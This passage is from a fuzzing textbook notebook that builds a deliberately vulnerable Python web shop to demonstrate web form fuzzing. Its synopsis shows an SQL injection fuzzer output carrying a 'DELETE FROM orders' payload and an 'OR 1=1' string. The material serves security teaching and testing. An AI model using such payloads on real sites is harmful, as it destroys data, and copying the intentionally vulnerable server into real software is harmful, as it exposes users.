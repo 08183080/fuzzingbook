{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Testing Web Applications\n",
    "\n",
    "In this chapter, we explore how to generate tests for Graphical User Interfaces (GUIs), notably on Web interfaces.  We set up a (vulnerable) Web server and demonstrate how to systematically explore its behavior – first with hand-written grammars, then with grammars automatically inferred from the user interface.  We also show how to conduct systematic attacks on these servers, notably with code and SQL injection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "**Prerequisites**\n",
    "\n",
    "* The techniques in this chapter make use of [grammars for fuzzing](Grammars.ipynb).\n",
    "* Basic knowledge of HTML and HTTP is required.\n",
    "* Knowledge of SQL databases is helpful."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Synopsis\n",
    "<!-- Automatically generated. Do not edit. -->\n",
    "\n",
    "To [use the code provided in this chapter](Importing.ipynb), write\n",
    "\n",
    "```python\n",
    ">>> from fuzzingbook.WebFuzzer import <identifier>\n",
    "```\n",
    "\n",
    "and then make use of the following features.\n",
    "\n",
    "\n",
    "This chapter provides a simple (and vulnerable) Web server and two experimental fuzzers that are applied to it.\n",
    "\n",
    "### Fuzzing Web Forms\n",
    "\n",
    "`WebFormFuzzer` demonstrates how to interact with a Web form.  Given a URL with a Web form, it automatically extracts a grammar that produces a URL; this URL contains values for all form elements.  Support is limited to GET forms and a subset of HTML form elements.\n",
    "\n",
    "Here's the grammar extracted for our vulnerable Web server:\n",
    "\n",
    "```python\n",
    ">>> web_form_fuzzer = WebFormFuzzer(httpd_url)\n",
    ">>> web_form_fuzzer.grammar['<start>']\n",
    "['<action>?<query>']\n",
    ">>> web_form_fuzzer.grammar['<action>']\n",
    "['/order']\n",
    ">>> web_form_fuzzer.grammar['<query>']\n",
    "['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']\n",
    "```\n",
    "Using it for fuzzing yields a path with all form values filled; accessing this path acts like filling out and submitting the form.\n",
    "\n",
    "```python\n",
    ">>> web_form_fuzzer.fuzz()\n",
    "'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit='\n",
    "```\n",
    "Repeated calls to `WebFormFuzzer.fuzz()` invoke the form again and again, each time with different (fuzzed) values.\n",
    "\n",
    "### SQL Injection Attacks\n",
    "\n",
    "`SQLInjectionFuzzer` is an experimental extension of `WebFormFuzzer` whose constructor takes an additional _payload_ – an SQL command to be injected and executed on the server.  Otherwise, it is used like `WebFormFuzzer`:\n",
    "\n",
    "```python\n",
    ">>> sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n",
    ">>> sql_fuzzer.fuzz()\n",
    "\"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit=\"\n",
    "```\n",
    "As you can see, the path to be retrieved contains the payload encoded into one of the form field values.\n",
    "\n",
    "`SQLInjectionFuzzer` is a proof-of-concept on how to build a malicious fuzzer; you should study and extend its code to make actual use of it.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "toc-hr-collapsed": false
   },
   "source": [
    "## A Web User Interface\n",
    "\n",
    "Let us start with a simple example.  We want to set up a _Web server_ that allows readers of this book to buy fuzzingbook-branded fan articles.  In reality, we would make use of an existing Web shop (or an appropriate framework) for this purpose.  For the purpose of this book, we _write our own Web server_, building on the HTTP server facilities provided by the Python library."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "All of our Web server is defined in a `HTTPRequestHandler`, which, as the name suggests, handles arbitrary Web page requests."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.122988Z",
     "iopub.status.busy": "2021-11-01T22:33:59.122152Z",
     "iopub.status.idle": "2021-11-01T22:33:59.125648Z",
     "shell.execute_reply": "2021-11-01T22:33:59.126175Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from http.server import HTTPServer, BaseHTTPRequestHandler, HTTPStatus"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.130349Z",
     "iopub.status.busy": "2021-11-01T22:33:59.129797Z",
     "iopub.status.idle": "2021-11-01T22:33:59.131147Z",
     "shell.execute_reply": "2021-11-01T22:33:59.131536Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n",
    "    pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Taking Orders\n",
    "\n",
    "For our Web server, we need a number of Web pages:\n",
    "* We want one page where customers can place an order.\n",
    "* We want one page where they see their order confirmed.  \n",
    "* Additionally, we need pages display error messages such as \"Page Not Found\"."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We start with the order form.  The dictionary `FUZZINGBOOK_SWAG` holds the items that customers can order, together with long descriptions:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.134716Z",
     "iopub.status.busy": "2021-11-01T22:33:59.134171Z",
     "iopub.status.idle": "2021-11-01T22:33:59.220960Z",
     "shell.execute_reply": "2021-11-01T22:33:59.221464Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import bookutils"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.225023Z",
     "iopub.status.busy": "2021-11-01T22:33:59.224487Z",
     "iopub.status.idle": "2021-11-01T22:33:59.226247Z",
     "shell.execute_reply": "2021-11-01T22:33:59.226614Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "FUZZINGBOOK_SWAG = {\n",
    "    \"tshirt\": \"One FuzzingBook T-Shirt\",\n",
    "    \"drill\": \"One FuzzingBook Rotary Hammer\",\n",
    "    \"lockset\": \"One FuzzingBook Lock Set\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This is the HTML code for the order form.  The menu for selecting the swag to be ordered is created dynamically from `FUZZINGBOOK_SWAG`.  We omit plenty of details such as precise shipping address, payment, shopping cart, and more."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.230732Z",
     "iopub.status.busy": "2021-11-01T22:33:59.230198Z",
     "iopub.status.idle": "2021-11-01T22:33:59.231826Z",
     "shell.execute_reply": "2021-11-01T22:33:59.232196Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_ORDER_FORM = \"\"\"\n",
    "<html><body>\n",
    "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
    "  <p>\n",
    "  Yes! Please send me at your earliest convenience\n",
    "  <select name=\"item\">\n",
    "  \"\"\"\n",
    "# (We don't use h2, h3, etc. here as they interfere with the notebook table of contents)\n",
    "\n",
    "\n",
    "for item in FUZZINGBOOK_SWAG:\n",
    "    HTML_ORDER_FORM += \\\n",
    "        '<option value=\"{item}\">{name}</option>\\n'.format(item=item,\n",
    "            name=FUZZINGBOOK_SWAG[item])\n",
    "\n",
    "HTML_ORDER_FORM += \"\"\"\n",
    "  </select>\n",
    "  <br>\n",
    "  <table>\n",
    "  <tr><td>\n",
    "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
    "  </td><td>\n",
    "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
    "  </td></tr>\n",
    "  <tr><td>\n",
    "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
    "  </td><td>\n",
    "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
    "  </tr></tr>\n",
    "  </table>\n",
    "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
    "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
    "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
    "</p>\n",
    "</form>\n",
    "</body></html>\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "This is what the order form looks like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.235211Z",
     "iopub.status.busy": "2021-11-01T22:33:59.234587Z",
     "iopub.status.idle": "2021-11-01T22:33:59.236165Z",
     "shell.execute_reply": "2021-11-01T22:33:59.236537Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from IPython.display import display"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.239323Z",
     "iopub.status.busy": "2021-11-01T22:33:59.238758Z",
     "iopub.status.idle": "2021-11-01T22:33:59.240348Z",
     "shell.execute_reply": "2021-11-01T22:33:59.240715Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from bookutils import HTML"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.248647Z",
     "iopub.status.busy": "2021-11-01T22:33:59.248105Z",
     "iopub.status.idle": "2021-11-01T22:33:59.253027Z",
     "shell.execute_reply": "2021-11-01T22:33:59.253413Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
       "  <p>\n",
       "  Yes! Please send me at your earliest convenience\n",
       "  <select name=\"item\">\n",
       "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
       "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
       "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
       "\n",
       "  </select>\n",
       "  <br>\n",
       "  <table>\n",
       "  <tr><td>\n",
       "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
       "  </td><td>\n",
       "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
       "  </td></tr>\n",
       "  <tr><td>\n",
       "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
       "  </td><td>\n",
       "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
       "  </tr></tr>\n",
       "  </table>\n",
       "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
       "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
       "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
       "</p>\n",
       "</form>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_ORDER_FORM)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This form is not yet functional, as there is no server behind it; pressing \"place order\" will lead you to a nonexistent page."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    },
    "toc-hr-collapsed": false
   },
   "source": [
    "### Order Confirmation\n",
    "\n",
    "Once we have gotten an order, we show a confirmation page, which is instantiated with the customer information submitted before.  Here is the HTML and the rendering:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.257873Z",
     "iopub.status.busy": "2021-11-01T22:33:59.257195Z",
     "iopub.status.idle": "2021-11-01T22:33:59.258974Z",
     "shell.execute_reply": "2021-11-01T22:33:59.259425Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_ORDER_RECEIVED = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
    "  <p id=\"confirmation\">\n",
    "  We will send <strong>{item_name}</strong> to {name} in {city}, {zip}<br>\n",
    "  A confirmation mail will be sent to {email}.\n",
    "  </p>\n",
    "  <p>\n",
    "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.264100Z",
     "iopub.status.busy": "2021-11-01T22:33:59.263338Z",
     "iopub.status.idle": "2021-11-01T22:33:59.266713Z",
     "shell.execute_reply": "2021-11-01T22:33:59.267197Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Rotary Hammer</strong> to Jane Doe in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_ORDER_RECEIVED.format(item_name=\"One FuzzingBook Rotary Hammer\",\n",
    "                                name=\"Jane Doe\",\n",
    "                                email=\"doe@example.com\",\n",
    "                                city=\"Seattle\",\n",
    "                                zip=\"98104\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Terms and Conditions\n",
    "\n",
    "A Web site can only be complete if it has the necessary legalese.  This page shows some terms and conditions."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.271522Z",
     "iopub.status.busy": "2021-11-01T22:33:59.270690Z",
     "iopub.status.idle": "2021-11-01T22:33:59.272445Z",
     "shell.execute_reply": "2021-11-01T22:33:59.272826Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_TERMS_AND_CONDITIONS = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Terms and Conditions</strong>\n",
    "  <p>\n",
    "  The content of this project is licensed under the\n",
    "  <a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\">Creative Commons\n",
    "  Attribution-NonCommercial-ShareAlike 4.0 International License.</a>\n",
    "  </p>\n",
    "  <p>\n",
    "  To place an order, use our <a href=\"/\">order form</a>.\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.276622Z",
     "iopub.status.busy": "2021-11-01T22:33:59.275968Z",
     "iopub.status.idle": "2021-11-01T22:33:59.278719Z",
     "shell.execute_reply": "2021-11-01T22:33:59.279094Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Terms and Conditions</strong>\n",
       "  <p>\n",
       "  The content of this project is licensed under the\n",
       "  <a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/\">Creative Commons\n",
       "  Attribution-NonCommercial-ShareAlike 4.0 International License.</a>\n",
       "  </p>\n",
       "  <p>\n",
       "  To place an order, use our <a href=\"/\">order form</a>.\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_TERMS_AND_CONDITIONS)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Storing Orders"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To store orders, we make use of a *database*, stored in the file `orders.db`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.282410Z",
     "iopub.status.busy": "2021-11-01T22:33:59.281877Z",
     "iopub.status.idle": "2021-11-01T22:33:59.284085Z",
     "shell.execute_reply": "2021-11-01T22:33:59.284465Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import sqlite3\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.287808Z",
     "iopub.status.busy": "2021-11-01T22:33:59.287167Z",
     "iopub.status.idle": "2021-11-01T22:33:59.288686Z",
     "shell.execute_reply": "2021-11-01T22:33:59.289217Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "ORDERS_DB = \"orders.db\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To interact with the database, we use *SQL commands*.  The following commands create a table with five text columns for item, name, email, city, and zip – the exact same fields we also use in our HTML form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.293582Z",
     "iopub.status.busy": "2021-11-01T22:33:59.292948Z",
     "iopub.status.idle": "2021-11-01T22:33:59.294676Z",
     "shell.execute_reply": "2021-11-01T22:33:59.295065Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def init_db():\n",
    "    if os.path.exists(ORDERS_DB):\n",
    "        os.remove(ORDERS_DB)\n",
    "\n",
    "    db_connection = sqlite3.connect(ORDERS_DB)\n",
    "    db_connection.execute(\"DROP TABLE IF EXISTS orders\")\n",
    "    db_connection.execute(\"CREATE TABLE orders (item text, name text, email text, city text, zip text)\")\n",
    "    db_connection.commit()\n",
    "\n",
    "    return db_connection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.298397Z",
     "iopub.status.busy": "2021-11-01T22:33:59.297870Z",
     "iopub.status.idle": "2021-11-01T22:33:59.301693Z",
     "shell.execute_reply": "2021-11-01T22:33:59.301228Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db = init_db()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "At this point, the database is still empty:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.305032Z",
     "iopub.status.busy": "2021-11-01T22:33:59.304430Z",
     "iopub.status.idle": "2021-11-01T22:33:59.306955Z",
     "shell.execute_reply": "2021-11-01T22:33:59.307380Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We can add entries using the SQL `INSERT` command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.311040Z",
     "iopub.status.busy": "2021-11-01T22:33:59.310430Z",
     "iopub.status.idle": "2021-11-01T22:33:59.313319Z",
     "shell.execute_reply": "2021-11-01T22:33:59.313701Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db.execute(\"INSERT INTO orders \" +\n",
    "           \"VALUES ('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')\")\n",
    "db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "These values are now in the database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.317306Z",
     "iopub.status.busy": "2021-11-01T22:33:59.316588Z",
     "iopub.status.idle": "2021-11-01T22:33:59.319407Z",
     "shell.execute_reply": "2021-11-01T22:33:59.319887Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('lockset', 'Walter White', 'white@jpwynne.edu', 'Albuquerque', '87101')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can also delete entries from the table again (say, after completion of the order):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.323560Z",
     "iopub.status.busy": "2021-11-01T22:33:59.322955Z",
     "iopub.status.idle": "2021-11-01T22:33:59.325726Z",
     "shell.execute_reply": "2021-11-01T22:33:59.326109Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db.execute(\"DELETE FROM orders WHERE name = 'Walter White'\")\n",
    "db.commit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.329506Z",
     "iopub.status.busy": "2021-11-01T22:33:59.328898Z",
     "iopub.status.idle": "2021-11-01T22:33:59.331381Z",
     "shell.execute_reply": "2021-11-01T22:33:59.331755Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Handling HTTP Requests\n",
    "\n",
    "We have an order form and a database; now we need a Web server which brings it all together.  The Python `http.server` module provides everything we need to build a simple HTTP server.  A `HTTPRequestHandler` is an object that takes and processes HTTP requests – in particular, `GET` requests for retrieving Web pages."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We implement the `do_GET()` method that, based on the given path, branches off to serve the requested Web pages.  Requesting the path `/` produces the order form; a path beginning with `/order` sends an order to be processed.  All other requests end in a `Page Not Found` message."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.336751Z",
     "iopub.status.busy": "2021-11-01T22:33:59.336127Z",
     "iopub.status.idle": "2021-11-01T22:33:59.337900Z",
     "shell.execute_reply": "2021-11-01T22:33:59.338277Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n",
    "    def do_GET(self):\n",
    "        try:\n",
    "            # print(\"GET \" + self.path)\n",
    "            if self.path == \"/\":\n",
    "                self.send_order_form()\n",
    "            elif self.path.startswith(\"/order\"):\n",
    "                self.handle_order()\n",
    "            elif self.path.startswith(\"/terms\"):\n",
    "                self.send_terms_and_conditions()\n",
    "            else:\n",
    "                self.not_found()\n",
    "        except Exception:\n",
    "            self.internal_server_error()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Order Form\n",
    "\n",
    "Accessing the home page (i.e. getting the page at `/`) is simple: We go and serve the `html_order_form` as defined above."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.342719Z",
     "iopub.status.busy": "2021-11-01T22:33:59.342140Z",
     "iopub.status.idle": "2021-11-01T22:33:59.344307Z",
     "shell.execute_reply": "2021-11-01T22:33:59.343737Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_order_form(self):\n",
    "        self.send_response(HTTPStatus.OK, \"Place your order\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(HTML_ORDER_FORM.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Likewise, we can send out the terms and conditions:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.348539Z",
     "iopub.status.busy": "2021-11-01T22:33:59.347955Z",
     "iopub.status.idle": "2021-11-01T22:33:59.349681Z",
     "shell.execute_reply": "2021-11-01T22:33:59.350055Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_terms_and_conditions(self):\n",
    "        self.send_response(HTTPStatus.OK, \"Terms and Conditions\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(HTML_TERMS_AND_CONDITIONS.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Processing Orders"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "When the user clicks `Submit` on the order form, the Web browser creates and retrieves a URL of the form\n",
    "\n",
    "```\n",
    "<hostname>/order?field_1=value_1&field_2=value_2&field_3=value_3\n",
    "```\n",
    "\n",
    "where each `field_i` is the name of the field in the HTML form, and `value_i` is the value provided by the user.  Values use the CGI encoding we have seen in the [chapter on coverage](Coverage.ipynb) – that is, spaces are converted into `+`, and characters that are not digits or letters are converted into `%nn`, where `nn` is the hexadecimal value of the character.\n",
    "\n",
    "If Jane Doe <doe@example.com> from Seattle orders a T-Shirt, this is the URL the browser creates:\n",
    "\n",
    "```\n",
    "<hostname>/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "When processing a query, the attribute `self.path` of the HTTP request handler holds the path accessed – i.e., everything after `<hostname>`.  The helper method `get_field_values()` takes `self.path` and returns a dictionary of values."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.353943Z",
     "iopub.status.busy": "2021-11-01T22:33:59.353243Z",
     "iopub.status.idle": "2021-11-01T22:33:59.355003Z",
